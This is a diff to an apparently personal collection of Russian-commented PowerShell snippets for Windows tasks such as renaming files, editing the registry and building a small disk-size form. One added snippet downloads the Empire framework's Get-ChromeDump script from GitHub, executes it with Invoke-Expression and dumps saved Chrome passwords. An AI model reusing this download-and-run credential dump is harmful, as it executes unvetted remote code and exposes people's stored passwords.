@@ -461,13 +461,16 @@ $c = 4
 Get-ChildItem -Path $path -Filter *.$e | Rename-Item -NewName {$_.Name.Substring(0,$_.BaseName.Length-$c) + $_.Extension}
 
 # Найти файлы, в названии которых каждое слово не написано с заглавной буквы
-(Get-ChildItem -Path $path -File -Recurse | Where-Object -FilterScript {($_.BaseName -replace "'|``") -cmatch "\b\p{Ll}\w*"}).FullName
+(Get-ChildItem -Path D:\Программы\AIMP -File -Recurse | Where-Object -FilterScript {($_.BaseName -replace "'|``") -cmatch "\b\p{Ll}\w*"}).FullName
 
 # Записать прописными буквами первую букву каждого слова в названии каждого файла в папке
 $TextInfo = (Get-Culture).TextInfo
 $path = "D:\folder"
 $e = "flac"
 Get-ChildItem -Path $path -Filter *.$e | Rename-Item -NewName {$TextInfo.ToTitleCase($_.BaseName) + $_.Extension}
+
+# Заменить слово в названии файлов в папке
+Get-ChildItem -Path "D:\folder" | Rename-Item -NewName {$_.Name.Replace("abc","cba")}
 
 # Добавить REG_NONE
 New-ItemProperty -Path HKCU:\Software -Name Name -PropertyType None -Value ([byte[]]@()) -Force
@@ -508,6 +511,7 @@ Out-File -FilePath file.ext -Encoding UTF8 -Force
 Add-Content -Path file.ext -Value content -Encoding UTF8 -Force
 
 # Вычислить продолжительность видеофайлов в папке
+# code.avalon-zone.be/retrieve-the-extended-attibutes-of-a-file
 Function Get-Duration
 {
 	param ($TargetFolder)
@@ -532,3 +536,66 @@ setx /M TEMP "%SystemDrive%\Temp"
 setx /M TMP "%SystemDrive%\Temp"
 setx TEMP "%SystemDrive%\Temp"
 setx TMP "%SystemDrive%\Temp"
+
+# Отобразить форму с выпадающим списком накопителей
+# Загрузить класс System.Windows.Forms
+Add-Type -AssemblyName System.Windows.Forms
+# Создать графическую форму
+$window_form = New-Object System.Windows.Forms.Form
+$window_form.Text ="Пример"
+$window_form.Width = 600
+$window_form.Height = 400
+$window_form.AutoSize = $true
+# Создать надпись
+$Label = New-Object System.Windows.Forms.Label
+$Label.Text = "Label"
+$Label.Location = New-Object System.Drawing.Point(0,10)
+$Label.AutoSize = $true
+$window_form.Controls.Add($Label)
+# Выпадающий список дисков
+$ComboBox = New-Object System.Windows.Forms.ComboBox
+$ComboBox.Width = 250
+$Disks = Get-PhysicalDisk
+Foreach ($Disk in $Disks)
+{
+	$ComboBox.Items.Add($Disk.FriendlyName);
+}
+$ComboBox.Location = New-Object System.Drawing.Point(60,10)
+$window_form.Controls.Add($ComboBox)
+# Надпись
+$Label2 = New-Object System.Windows.Forms.Label
+$Label2.Text = "Disk size:"
+$Label2.Location = New-Object System.Drawing.Point(0,40)
+$Label2.AutoSize = $true
+$window_form.Controls.Add($Label2)
+$Label3 = New-Object System.Windows.Forms.Label
+$Label3.Text = ""
+$Label3.Location = New-Object System.Drawing.Point(110,40)
+$Label3.AutoSize = $true
+$window_form.Controls.Add($Label3)
+# Кнопка
+$Button = New-Object System.Windows.Forms.Button
+$Button.Location = New-Object System.Drawing.Size(400,10)
+$Button.Size = New-Object System.Drawing.Size(120,23)
+$Button.Text = "Check"
+$window_form.Controls.Add($Button)
+# Расчет
+$Button.Add_Click(
+	{
+		$Label3.Text = [math]::round(($Disks | Where-Object -FilterScript {$_.FriendlyName -eq $ComboBox.SelectedItem}).Size/1GB,2)
+	}
+)
+# Отобразить форму
+$window_form.ShowDialog()
+
+# Вывести сохраненные пароли Google Chrome
+$url = 'https://raw.githubusercontent.com/adaptivethreat/Empire/master/data/module_source/collection/Get-ChromeDump.ps1'
+$code = Invoke-RestMethod -Uri $url -UseBasicParsing
+Invoke-Expression $code
+Get-ChromeDump
+
+# Найти неустановленные обновления
+$UpdateSession = New-Object -ComObject Microsoft.Update.Session
+$UpdateSearcher = $UpdateSession.CreateupdateSearcher()
+$Updates = @($UpdateSearcher.Search("IsHidden=0 and IsInstalled=0").Updates)
+$Updates | Select-Object Title
